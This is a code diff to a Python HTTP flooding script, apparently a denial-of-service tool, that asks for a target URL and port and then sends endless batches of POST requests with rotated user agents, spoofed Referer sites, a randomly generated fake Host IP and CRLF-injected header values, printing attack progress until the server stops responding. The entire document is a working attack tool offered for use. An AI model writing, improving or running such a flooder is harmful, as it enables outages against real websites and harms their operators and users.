@@ -31,9 +31,9 @@ print(blue + f"\t\tDon't Recode This Skid!!")
 print(blue + f"\tEnjoy!")
 print('\033[1;3m')
 ip = input(yellow + f"Target URL : ")
-if "https://" in ip:
+if ip:
     pass
-elif "https://" in ip is None:
+else:
     ip = f"https://{ip}"    
 port = input(yellow + "Port : ")
 if os.name == "posix":
@@ -47,17 +47,27 @@ while True:
     counter = counter + 1
     for i in range(200):
         try:
+            ang = ['1','2','3','4','5','6','7','8','9','0']
+            n1 = random.choice(ang)
+            n2 = random.choice(ang)
+            n3 = random.choice(ang)
+            n4 = random.choice(ang)
+            n5 = random.choice(ang)
+            n6 = random.choice(ang)
+            n7 = random.choice(ang)
+            fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
             y = random.choice(user_agents)
             url = ip
             urls = ['https://www.dpr.go.id', 'https://www.yandex.com', 'https://eiht.my.id', 'https://www.google.com', 'https://www.nasa.gov', 'https://www.cia.gov', 'https://spacex.com', 'https://lahelu.com', 'https://data.gov.il', 'https://kosred.com', 'https://pornhub.com']
             res = random.choice(urls)
             headers = {
-                "User-Agent": f"{y}",
-                "Pragma": "no-cache",
-                "Connection": "Keep-Alive",
-                "Referer": f"{res}",
-                "Cache-Control": "no-store, no-cache",
-                "Host": "192.167.1.5"
+                "User-Agent": f"{y}\r\n\r\n",
+                "Pragma": "no-cache\r\n\r\n",
+                "Connection": "Keep-Alive\r\n\r\n",
+                "Referer": f"{res}\r\n\r\n",
+                "Cache-Control": "no-store, no-cache\r\n\r\n",
+                "Host": f"{fip}",
+                "GET": " / HTTP/1.1\r\n\r\n"
             }
             response = requests.post(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
@@ -69,4 +79,3 @@ while True:
             print(red + f"Error While Attacking.. Did you write the Targets URL correctly?")
             exit()
     print(green + f"[ + ] The Server Just Stopped Responding.. [ + ]")
-    
